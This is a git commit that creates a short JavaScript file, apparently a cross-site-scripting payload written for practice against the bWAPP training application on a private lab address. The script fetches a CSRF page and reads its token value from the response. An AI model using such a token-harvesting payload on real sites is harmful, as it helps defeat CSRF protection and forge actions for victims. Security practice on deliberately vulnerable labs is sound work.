46c3121b166f3bf5aca85879ab53e3c93f2606aa
AjayGhale99 <65097336+AjayGhale99@users.noreply.github.com>
2020-05-10 02:56:08 +0100

    Create xss4.js

---
+++ xss4.js
@@ -0,0 +1,13 @@
+var xhr1 = new XMLHttpRequest();
+xhr1.open("GET","http://192.168.111.130/bWAPP/csrf_3.php",true)
+xhr1.responseType='document';
+xhr1.send();
+xhr1.onload = function(){
+if (xhr1.status==200)
+{
+ddd=xhr1.response;
+TOKEN=ddd.getElementsByName("action");
+TOKEN=TOKEN[0].value;
+console.log(TOKEN);
+}
+}
